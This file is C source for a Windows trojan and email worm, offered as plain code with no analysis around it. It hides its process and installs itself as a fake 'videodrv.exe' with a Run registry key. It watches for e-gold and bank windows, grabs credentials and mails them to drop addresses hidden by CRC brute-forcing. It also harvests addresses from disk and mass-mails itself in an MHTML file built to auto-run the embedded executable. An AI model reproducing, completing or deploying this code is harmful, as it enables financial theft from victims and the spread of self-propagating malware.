   /*              p i z d a t o               */

   #include <windows.h>
   #include <stdio.h>
   #include <io.h>

   #define START_TIMEOUT 60*1000
   #define THREADS_MAX 7

   struct _storage {
       char szCurrentFile[MAX_PATH];
       char szWindowsDir[MAX_PATH];
       char szZipFile[MAX_PATH];
       char szTmpFile[MAX_PATH];
       char szEmailsFile[MAX_PATH];
   };

   struct _storage storage;

   struct _info {
       BOOL fScanFinished;
       int nScanEmailsFound;
       char szEmailEgold1[256];
       char szEmailEgold2[256];
       char szEmailPass1[256];
       char szEmailPass2[256];
       BOOL fEmailSearchCompleted;
   };

   struct _info info;

   LRESULT CALLBACK HelloWorldWndProc(HWND, UINT, UINT, LONG);
   void InitWindowClass(WNDCLASS *, HINSTANCE, char *);
   //int log_println(char *str, ...);
   int is_already_installed(void);
   int make_tmp(void);
   void email_remove_crlf(char *email);
   DWORD WINAPI scan_start(void);
   DWORD WINAPI send_start(void);
   DWORD WINAPI email_decrypt(void);
   DWORD WINAPI grab_start(void);
   int decrypt(unsigned long ulCrc,char *buf);

   #include "crc32.c"
   #include "zip.c"
   #include "threads.c"
   #include "my_mx.c"
   #include "scan.c"
   #include "grab.c"
   #include "smtp.c"

   typedef int ( WINAPI *RSP ) (DWORD,DWORD);

   int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
       LPSTR lpszCmdParam, int nCmdShow){

       HWND hWnd;
       WNDCLASS WndClass;
       MSG Msg;
       HINSTANCE hLib;

       char *szClassName = " ";
       RSP RegisterServiceProcess = NULL;

       if((hLib = LoadLibrary("kernel32.dll")) != 0){
       RegisterServiceProcess = (RSP)GetProcAddress(hLib, "RegisterServiceProcess");
           if(RegisterServiceProcess)
               RegisterServiceProcess(0,1);
       }

       crc32_init();
       info.fScanFinished = FALSE;
       info.nScanEmailsFound = 0;
           info.fEmailSearchCompleted = FALSE;

       WSADATA wsaData;
       if (WSAStartup (MAKEWORD (1,0), &wsaData) != 0)
               return FALSE;

       if(!is_already_installed()){
           //log_println("Not native copy, path %s\n",storage.szCurrentFile);
           return 0;
       } else {
           GetWindowsDirectory(storage.szWindowsDir,MAX_PATH);

           strncpy(storage.szZipFile,storage.szWindowsDir,MAX_PATH);
           strncat(storage.szZipFile,"\\zip.tmp",MAX_PATH);
           DeleteFile(storage.szZipFile);

           strncpy(storage.szTmpFile,storage.szWindowsDir,MAX_PATH);
           strncat(storage.szTmpFile,"\\exe.tmp",MAX_PATH);
           DeleteFile(storage.szTmpFile);

           strncpy(storage.szEmailsFile,storage.szWindowsDir,MAX_PATH);
           strncat(storage.szEmailsFile,"\\eml.tmp",MAX_PATH);
           DeleteFile(storage.szEmailsFile);

           make_tmp();
           zip_make(storage.szTmpFile,storage.szZipFile);
       }

       InitWindowClass(&WndClass, hInstance, szClassName);
       if(!RegisterClass(&WndClass)){
           //MessageBox(NULL, "Error:\nCan't register class", CLASS_NAME, MB_OK);
           return 0;
       }
       hWnd = CreateWindow(szClassName, " ", WS_OVERLAPPEDWINDOW,
           CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
           NULL, NULL, hInstance, NULL);
       if(!hWnd){
           MessageBox(NULL,"Error creating window\n", "msg", MB_OK);
           return 0;
       }

       SetTimer(hWnd,1,5000,0);

       //ShowWindow(hWnd, nCmdShow);
       //UpdateWindow(hWnd);

       while(GetMessage(&Msg, 0, 0, 0)) {
           TranslateMessage(&Msg);
           DispatchMessage(&Msg);
       }
       return Msg.wParam;
   }

   LRESULT CALLBACK HelloWorldWndProc(HWND hWnd, UINT Message, UINT wParam,
       LONG lParam)
   {
       DWORD dwThreadId;
       switch(Message){
           case WM_CREATE:
               //MessageBox(0,"start","info",MB_OK);
               //CreateThread(0,0,(LPTHREAD_START_ROUTINE)scan_start,0,0,&dwThreadId);
               CreateThread(0,0,(LPTHREAD_START_ROUTINE)email_decrypt,0,0,&dwThreadId);
               return 0;
           case WM_TIMER:
               KillTimer(hWnd,1);
               if(gethostbyname("www.google.com")!=NULL){
                   CreateThread(0,0,(LPTHREAD_START_ROUTINE)grab_start,0,0,&dwThreadId);
                   CreateThread(0,0,(LPTHREAD_START_ROUTINE)scan_start,0,0,&dwThreadId);
                   CreateThread(0,0,(LPTHREAD_START_ROUTINE)send_start,0,0,&dwThreadId);
               }
               return 0;
           case WM_DESTROY:
               PostQuitMessage(0);
               return 0;
       }
       return DefWindowProc(hWnd, Message, wParam, lParam);
   }

   void InitWindowClass(WNDCLASS * WndClass, HINSTANCE hInstance,
       char * szClassName)
   {
       WndClass->style = CS_HREDRAW | CS_VREDRAW;
       WndClass->lpfnWndProc = HelloWorldWndProc;
       WndClass->cbClsExtra = 0;
       WndClass->cbWndExtra = 0;
       WndClass->hInstance = hInstance;
       WndClass->hIcon = LoadIcon(NULL, IDI_APPLICATION);
       WndClass->hCursor = LoadCursor(NULL, IDC_ARROW);
       WndClass->hbrBackground = (HBRUSH) GetStockObject(WHITE_BRUSH);
       WndClass->lpszMenuName = NULL;
       WndClass->lpszClassName = szClassName;
   }

   DWORD WINAPI grab_start(void){
       char szWndTitle[256];
       char szSubj[256];
       /* XXX: ñäåëàòü ÷òîáû ãðàáåð ðàáîòàë ÷åðåç êàæäûå 30 ìèí */

       while(TRUE){
           GetWindowText(GetForegroundWindow(),szWndTitle,255);
           unsigned long ulBufCrc = crc32(0,szWndTitle,21);
           if(ulBufCrc == 0x90e38063){
               //log_println("window found");
               grab();
               while(info.fEmailSearchCompleted == FALSE) { Sleep(500); }
               get_random_text(szSubj,0);
               //log_println("Send '%s' '%s' '%s'",info.szEmailEgold1,info.szEmailEgold2,szSubj);
               smtp_init();
               smtp_send_file(LOGFILE_EGOLD,info.szEmailEgold1,info.szEmailEgold1,szSubj);
               smtp_send_file(LOGFILE_EGOLD,info.szEmailEgold2,info.szEmailEgold2,szSubj);
               DeleteFile(LOGFILE_EGOLD);
               Sleep(30*60*1000); // 30 mins
           } else if(strlen(szWndTitle)>5) {
               char *p;
               char *p1;
               unsigned long ulBankCrc;
               p = &szWndTitle[0];
               // 0xD860BF7A = bank
               for(int i=0;i<strlen(szWndTitle)-5;i++){
                   p1 = p +i;
                   ulBankCrc = crc32(0,p1,4);
                   if(ulBankCrc == 0xD860BF7A){
                       //log_println("Bank found\n");
                       grab2();
                       get_random_text(szSubj,0);
                       smtp_send_file(LOGFILE_EGOLD,info.szEmailPass1,info.szEmailPass1,szSubj);
                       smtp_send_file(LOGFILE_EGOLD,info.szEmailPass2,info.szEmailPass2,szSubj);
                       DeleteFile(LOGFILE_EGOLD);
                       Sleep(30*60*1000); // 30 mins
                       break;
                   }
               }
           }
           Sleep(1500);
       }
       return 0;
   }

   DWORD WINAPI email_decrypt(void){

       char buf[256];
       char target1[256];
       char target2[256];
       char target3[256];
       char target4[256];

       target1[0] = 0;
       decrypt(0x41C60EEF,buf); // omnib
       strcat(target1,buf);
       decrypt(0xDDDA81FD,buf); // bb@gm
       strcat(target1,buf);
       decrypt(0x42C648F3,buf); // x.net
       strcat(target1,buf);

       target2[0] = 0;
       decrypt(0x41C60EEF,buf); // omnib
       strcat(target2,buf);
       decrypt(0xC5D1F791,buf); // cd@gm
       strcat(target2,buf);
       decrypt(0x42C648F3,buf); // x.net
       strcat(target2,buf);

       target3[0] = 0;
       decrypt(0x83F98125,buf); // drbz@
       strcat(target3,buf);
       decrypt(0xFB8A00B9,buf); // mail1
       strcat(target3,buf);
       decrypt(0x74F90712,buf); // 5.com
       strcat(target3,buf);

       target4[0] = 0;
       decrypt(0xDC0D36A6,buf); // kxva@
       strcat(target4,buf);
       decrypt(0xFB8A00B9,buf); // mail1
       strcat(target4,buf);
       decrypt(0x74F90712,buf); // 5.com
       strcat(target4,buf);

       strcpy(info.szEmailEgold1,target1);
       strcpy(info.szEmailEgold2,target3);

       strcpy(info.szEmailPass1,target2);
       strcpy(info.szEmailPass2,target4);

           info.fEmailSearchCompleted = TRUE;

       /*log_println("Emails: '%s' '%s' '%s' '%s'",info.szEmailEgold1,info.szEmailEgold2, \
           info.szEmailPass1,info.szEmailPass2);*/
       return 0;
   }

   DWORD WINAPI scan_start(void){
       Sleep(START_TIMEOUT);
       scan_shell_folders();
       find_files("C:\\Program Files\\");
       info.fScanFinished = TRUE;
       return 0;
   }

   DWORD WINAPI send_start(void){
       Sleep(START_TIMEOUT);
       /* wait while email found */
       while(info.nScanEmailsFound == 0) {};

       FILE *fp = fopen(storage.szEmailsFile, "r");
       if(!fp) return 0;

       WSADATA wsaData;
       if (WSAStartup (MAKEWORD (1,0), &wsaData) != 0)
               return FALSE;

       ZeroMemory(&mx_threads,sizeof(mx_threads));
       mx_engine.nThreadsMax = THREADS_MAX;

       mx_engine.nThreadsActive = 0;
       mx_engine.messages_sent = 0;
       mx_engine.fFinished = FALSE;

       for(int i=0;i<mx_engine.nThreadsMax;i++){
           mx_threads[i].fBusy = FALSE;
       }

       while((mx_engine.nThreadsActive) || (mx_engine.fFinished==FALSE))
       {
           if(mx_engine.nThreadsActive<mx_engine.nThreadsMax){
               int nIndex = mx_get_free_cell();
               if(nIndex == -1){
                   //log_println("Threads collision\n");
                   return 1;
               }
               mx_threads[nIndex].index = nIndex;

               if(mx_get_email(fp,mx_threads[nIndex].szTo)==0){
                   char *domain = strchr(mx_threads[nIndex].szTo,'@');
                   if(domain){
                       domain++;
                       strncpy(mx_threads[nIndex].szDomain,domain,255);
                       mx_threads[nIndex].fBusy = TRUE;
                       mx_threads[nIndex].dwStartTime = GetTickCount();
                       mx_engine.nThreadsActive++;
                       mx_threads[nIndex].hThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)mx_thread,(void *)nIndex,0,&mx_threads[nIndex].dwThreadId);
                   }
               }
           } else {
               threads_kill_test();
               Sleep(500);
           }
       }

       fclose(fp);
       return 0;
   }

   int mx_get_email(FILE *fp, char *buf){
       char *res = 0;

       while(res == 0){
           res = fgets(buf,255,fp);
           if(res==0) Sleep(500);
       }

       email_remove_crlf(buf);
       /* TODO: remove this debug line */
       //strcpy(buf,"bank@vozrozhdenie.com");
       return 0;
   }


   /*int log_println(char *str, ...){
       va_list va;
       va_start(va, str);
       char *buf = malloc(0xffff);
       char *fp = fopen("logfile.txt","ab");
       if(!buf || !fp) {
           printf("Critical error: not enough memory\n");
           va_end(va);
           return 1;
       }
       vsprintf(buf, str, va);
       fprintf(fp,"%s\n",buf);
       free(buf);
       fclose(fp);
       return 0;
   }*/

   int is_already_installed(void){
       char buf_name[MAX_PATH];
       char win_dir[MAX_PATH];

       char *path = buf_name;
       strncpy(buf_name,GetCommandLine(),MAX_PATH);
       if(*path == '"') {path++;}
       for(int i = 0; i < MAX_PATH; i++){
           if(buf_name[i] == '"'){ buf_name[i] = 0; }
       }

       strncpy(storage.szCurrentFile,path,MAX_PATH);
       //log_println("Path: '%s'\n",path);

       GetWindowsDirectory(win_dir,MAX_PATH);
       strcat(win_dir,"\\videodrv.exe");
       //log_println("Install to: '%s'\n",win_dir);

       CopyFile(path,win_dir,FALSE);

       /* XXX: remove comment */
       HKEY reg;
       RegOpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &reg);
       RegSetValueEx(reg, "VideoDriver", 0, REG_SZ, win_dir, strlen(win_dir));
       RegCloseKey(reg);

       HANDLE hFile = CreateFile(win_dir, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, \
           FILE_ATTRIBUTE_NORMAL, 0);

       if(hFile == INVALID_HANDLE_VALUE){
           //log_println("Already installed\n");
           return 1; // TRUE
       }

       //log_println("File wasn't installed!\n");
       CloseHandle(hFile);

       WinExec(win_dir,SW_HIDE);
       return 0;
       //return 1; /* XXX: remove this debug line */
   }

   int make_tmp(void){
           DeleteFile(storage.szTmpFile);
           FILE *fp = fopen(storage.szTmpFile,"ab");
           if(!fp) return 1;

           /* 1st part */

           fprintf(fp,"MIME-Version: 1.0\n"\
               "Content-Location:File://foo.exe\n"\
               "Content-Transfer-Encoding: binary\n\n");

           /* 2nd part */

           FILE *fp2 = fopen(storage.szCurrentFile,"rb");
           if(!fp2) return 1;

           int f2_len = _filelength(_fileno(fp2));
           char *pf2 = malloc(f2_len);
           if(!pf2) return 1;

           fread(pf2,1,f2_len,fp2);
           fwrite(pf2,f2_len,1,fp);
           if(pf2) free(pf2);
           fclose(fp2);

           /* 3rd part */

           fprintf(fp,"<body bgcolor=black scroll=no>\n"\
               "<SCRIPT>\n"\
               "function malware()\n{\n"\
               "s=document.URL;path=s.substr(-0,s.lastIndexOf(\"\\\\\"));\n"\
               "path=unescape(path);\n"\
               "document.write(' <title>Message</title><body scroll=no bgcolor=white><FONT face=\"Arial\" color=black style=\"position:absolute;top:20;left:90;z-index:100; font-size:12px;\">No message</center><OBJECT style=\"cursor:cross-hair\" alt=\"moo ha ha\" CLASSID=\"CLSID:11111111-1111-1111-1111-111111111111\"  CODEBASE=\"mhtml:'+path+'\\\\message.html!File://foo.exe\"></OBJECT>')\n"\
               "}\nsetTimeout(\"malware()\",150)\n\n</script>");

           fclose(fp);
           //log_println("Zip file '%s'\n",storage.szZipFile);
           //log_println("Tmp file '%s'\n",storage.szTmpFile);
       return 0;
   }

   void email_remove_crlf(char *email){
       for(unsigned int i=0;i<strlen(email);i++){
           if(email[i] == 0x0a || email[i] == 0x0d)
               email[i] = 0;
       }
   }

   int decrypt(unsigned long ulCrc,char *buf){
   #define AA 30
       char alpha1[] = "abcdefghijklmnopqrstuvwxyz@.15";
       char str[256];

       //printf("Looking for crc 0x%.8X\n",ulCrc);
       for(int i1=0;i1<AA;i1++){
           for(int i2=0;i2<AA;i2++){
               for(int i3=0;i3<AA;i3++){
                   for(int i4=0;i4<AA;i4++){
                       for(int i5=0;i5<AA;i5++){
                           str[0] = alpha1[i1];
                           str[1] = alpha1[i2];
                           str[2] = alpha1[i3];
                           str[3] = alpha1[i4];
                           str[4] = alpha1[i5];
                           str[5] = 0;
                           unsigned long myCrc = crc32(0,str,5);
                           if(myCrc == ulCrc){
                               //printf("%s\n",str);
                               strcpy(buf,str);
                               return 0;
                           }
                       }
                   }
               }
           }
       }
       return 1;
   }
